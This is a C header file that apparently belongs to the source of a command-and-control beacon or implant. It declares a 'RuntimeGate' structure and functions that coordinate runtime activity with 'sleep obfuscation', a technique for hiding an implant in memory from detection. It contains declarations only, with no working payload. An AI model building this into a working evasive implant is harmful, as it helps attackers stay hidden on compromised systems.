#pragma once

#include "beacon_common.h"

struct BeaconContext;

typedef struct RuntimeGate {
    CRITICAL_SECTION lock;
    LONG active_count;
    LONG sleep_obf_pending;
    LONG sleep_obf_active;
    HANDLE wake_event;
} RuntimeGate;

VOID RuntimeGateInit(RuntimeGate* gate);
VOID RuntimeGateFree(RuntimeGate* gate);
BOOL RuntimeActivityBegin(struct BeaconContext* ctx);
VOID RuntimeActivityEnd(struct BeaconContext* ctx);
BOOL RuntimeSleepObfBegin(struct BeaconContext* ctx);
VOID RuntimeSleepObfEnd(struct BeaconContext* ctx);
